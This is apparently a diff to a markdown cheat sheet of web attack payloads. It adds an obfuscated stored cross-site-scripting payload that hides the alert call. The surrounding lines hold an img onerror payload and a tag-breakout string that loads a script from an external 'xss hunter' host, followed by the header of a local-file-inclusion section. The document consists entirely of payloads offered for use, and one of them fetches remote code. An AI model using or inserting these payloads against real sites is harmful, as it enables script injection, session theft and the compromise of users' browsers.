@@ -1,5 +1,6 @@
 # Payload Stored XSS
 #### <img src=x onerror​=alert(origin)>
+#### <img src="X" onerror​=top[8680439..toString(30)](1337)>
 #### test“;”/></{dynamic tag}></script><script/SRC=//{xss hunter url} /  (stored xss)
 
 # Payload LFI
